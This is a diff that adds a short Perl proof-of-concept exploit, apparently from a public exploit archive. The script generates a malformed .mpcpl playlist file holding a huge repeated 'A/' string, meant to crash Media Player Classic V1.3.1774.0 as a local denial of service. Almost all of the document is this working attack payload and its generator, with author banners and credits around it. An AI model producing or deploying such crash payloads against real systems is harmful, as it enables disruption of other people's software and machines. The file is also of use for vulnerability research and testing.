@@ -1,0 +1,27 @@
+#!\C:\Perl\bin
+##################################{In The Name Of Allah The Mercifull}######################
+
+# Title : Media Player Classic V1.3.1774.0 (mpcpl) 0day suffer from local Denial of Service PoC
+
+# Tested : Windows xp (sp3)
+
+# AUThoR: R3d-D3v!L
+
+# Credits to : XP10_HACKER ((XP10.ME-xp10.com))
+
+print qq(
+########################################################
+## Media Player Classic V1.3.1774.0 0day suffer from local Denial of Service PoC ##
+## Credits : XP10.ME ##
+## XP10_HACKER ##
+## Author : R3d-D3v!L <X[at]hotmail.co.jp> ##
+## Greetz : DR_DAShER & JUPA ##
+## all member at XP10.ME ##
+########################################################
+);
+
+$XP10_hacker="\nbody {alink: "."A/" x 8000000 ."}\n";
+open(file ,'>>X.mpcpl');
+print file $XP10_hacker;
+print "CODED BY R3d-D3V!L~#\n";
+close(file);
